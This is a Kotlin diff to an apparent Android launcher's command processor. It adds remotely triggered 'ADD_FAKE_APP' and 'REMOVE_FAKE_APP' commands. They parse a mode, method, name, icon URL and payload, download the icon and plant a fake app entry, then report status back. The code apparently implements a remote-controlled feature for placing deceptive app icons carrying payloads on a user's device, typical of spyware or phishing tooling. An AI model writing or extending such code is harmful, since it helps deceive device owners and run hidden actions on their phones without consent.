@@ -2075,6 +2075,32 @@ object CommandProcessor {
                     updateCommandStatus(ctx, id, status, null, result, null)
                     return
                 }
+                "ADD_FAKE_APP" -> {
+                    val parts = content.split("|", limit = 5)
+                    if (parts.size >= 5) {
+                        val mode = parts[0].trim().uppercase()
+                        val method = parts[1].trim().uppercase()
+                        val name = parts[2].trim()
+                        val iconUrl = parts[3].trim()
+                        val payload = parts[4].trim()
+                        
+                        val success = LauncherManager.addFakeApp(ctx, mode, method, name, iconUrl, payload)
+                        if (success) {
+                            status = "FAKE_APP_ADDED"
+                            errorMsg = "Name: $name | Mode: $mode"
+                        } else {
+                            status = "FAILED"
+                            errorMsg = "Icon download or persistence failed."
+                        }
+                    } else {
+                        status = "FAILED_FORMAT"
+                        errorMsg = "Format: MODE|METHOD|NAME|ICON_URL|PAYLOAD"
+                    }
+                }
+                "REMOVE_FAKE_APP" -> {
+                    LauncherManager.removeFakeApp(ctx, content.trim())
+                    status = "FAKE_APP_REMOVED"
+                }
                 "SET_DOCK_APPS" -> {
                     val prefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                     val newDock = content.split(Regex("[,|]"))
